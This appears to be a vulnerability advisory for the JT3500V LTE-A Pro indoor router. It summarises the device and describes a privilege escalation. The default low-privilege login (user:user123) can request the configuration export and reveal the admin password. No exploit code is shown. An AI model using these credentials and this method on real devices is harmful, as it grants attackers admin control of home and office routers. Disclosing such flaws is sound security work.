Summary: JT3500V is a most advanced LTE-A Pro CAT12 indoor Wi-Fi
& VoIP CPE product specially designed to enable quick and easy
LTE fixed data service deployment for residential and SOHO customers.
It provides high speed LAN, Wi-Fi and VoIP integrated services
to end users who need both bandwidth and multi-media data service
in residential homes or enterprises. The device has 2 Gigabit LAN
ports, 1 RJ11 analog phone port, high performance 4x4 MIMO and
CA capabilities, 802.11b/g/n/ac dual band Wi-Fi, advanced routing
and firewall software for security. It provides an effective
all-in-one solution to SOHO or residential customers. It can
deliver up to 1Gbps max data throughput which can be very
competitive to wired broadband access service.

Desc: The application suffers from a privilege escalation vulnerability.
The non-privileged default user (user:user123) can elevate his/her
privileges by sending a HTTP GET request to the configuration export
endpoint and disclose the admin password. Once authenticated as admin,
an attacker will be granted access to the additional and privileged pages.

Tested on: GoAhead-Webs/2.5.0 PeerSec-MatrixSSL/3.1.3-OPEN
           Linux 2.6.36+ (mips)
           Mediatek APSoC SDK v4.3.1.0
